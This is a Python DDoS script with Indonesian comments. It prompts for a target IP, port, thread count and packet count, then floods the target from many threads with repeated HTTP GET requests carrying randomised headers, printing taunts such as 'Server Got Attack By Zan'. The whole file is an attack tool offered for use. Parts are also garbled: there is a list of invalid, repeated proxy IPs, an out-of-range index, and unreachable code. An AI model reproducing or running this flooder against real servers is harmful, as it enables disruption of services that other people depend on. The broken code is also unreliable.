#Ddos Dulu biar gacor
import threading
import time
import os, sys
import socket
import random
import requests
useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
ref=['http://www.bing.com/search?q=',
'https://www.ndex.com/ndsearch?text=',
'https://duckduckgo.com/?q=']
socks5=[""" 192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389
192.72.891.1:443 172.156.86.18:80 34.72.1.89:3389"""]
acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept-Encoding: gzip, deflate\r\n",
"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
"Accept-Language: en-US,en;q=0.5\r\n"]

ip = str(input("Ip >= "))
port = int(input("port >= "))
th = int(input("Thread/t >="))
pack = int(input("Pack/s >="))

def spoof():
  global byte1
  a1 = random.randint(0, 255)
  a2 = random.randint(0, 255)
  a3 = random.randint(0, 255)
  a4 = random.randint(0, 255)
  
  byte1 = random._urandom(55041)
 
  yt = [""" gacor by zan """]
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

  return byte1
  
  
def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(0, 255))
    addr[4] = str(random.randrange(2, 254))
    acces =  addr[1] + addr[2] + addr[3] + addr[4]
    return acces
def start2():
  global useragents, acceptall, ref, socks5
  global byte3, byte4
  byte3 = random._urandom(40552)
  byte4 = random.choice(acceptall)+random.choice(ref)
  reef = random.choice(ref)
  acceppt = random.choice(socks5)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  byte_host = byte3 + byte4 + acceppt + "\r\n"
  return byte_host
  while True:
            try:
               s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
               s.connect((str(ip),int(port)))
               s.send(byte_host)
               for i in range(pack):
                   s.send(byte_host)
                   xx += random.randint(0, int(pack))
                   print("Server Got Attack By Zan ")
            except:
                  s.close()
                  print("Ez Crashh")
                  
  return byte3
  return byte4
  
def start():
  global useragents, acceptall, ref, socks5
  hh = random._urandom(75006)
  byte2 = random._urandom(34002)
  xx = int(0)
  userKagen = "UserAgents: "+random.choice(useragents)+random.choice(acceptall)+random.choice(ref)+"\r\n"
  Userkw = "Binatang: "+random.choice(socks5)+random.choice(ref)+random.choice(useragents)+random.choice(acceptall)+"\r\n"
  acceptser = "AcceptAdmin: "+random.choice(acceptall)+random.choice(ref)+"\r\n"
  referrer = random.choice(ref)
  content    = "Content-Type: application/x-www-form-urlencoded\r\n"
  length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
  target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
  main_host = userKagen + acceptser + referrer + content + length + Userkw + target_host + "\r\n"
  while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
            s.send(str.encode(main_host))
            for i in range(pack):
                s.send(str.encode(main_host))
                xx += random.randint(0, int(pack))
            print("Server Got Attack By Zan ")
        except:
            s.close()
            print("Ez Crashh")
for i in range(th):
  th1 = threading.Thread(target=start)
  th1.start()

  #aku mah pemula bisa apa?
